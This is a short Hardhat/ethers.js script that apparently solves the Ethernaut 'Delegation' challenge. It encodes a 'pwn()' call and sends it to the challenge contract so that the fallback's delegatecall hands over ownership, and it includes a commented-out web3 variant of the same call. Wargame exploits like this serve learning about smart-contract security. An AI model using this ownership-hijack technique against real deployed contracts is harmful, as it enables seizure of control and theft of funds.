const { ethers } = require("hardhat");
// const {BigNumber} = require('ethers.utils.BigNumber')




async function main() {
    const [eoa, accomplice] = await ethers.getSigners();
    const eoaAddress = await eoa.getAddress();

    const challange = await ethers.getContractAt("Delegation", '0x3b573E574fD2DAf06535AC9629E5c43a477DFFB7');
    console.log(challange.address);

    // Set up an ethers contract, representing our deployed Box instance
// const address = '0x3b573E574fD2DAf06535AC9629E5c43a477DFFB7';
// const Box = await ethers.getContractFactory('Delegation');
// const box = await Box.attach(address);
// console.log(box.address);

const delegateeAbi = ['function pwn()']
let iface = new ethers.utils.Interface(delegateeAbi)
const data = iface.encodeFunctionData(`pwn`, [])

tx = await eoa.sendTransaction({
  from: await eoa.getAddress(),
  to: challange.address,
  data,
  gasLimit: 100000,
})

/**
 * or
 * 
 * let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

await web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: payload
});
 */

} 

main()
.then(() => process.exit(0))
.catch((error) => {
    console.error(error);
    process.exit(1);
})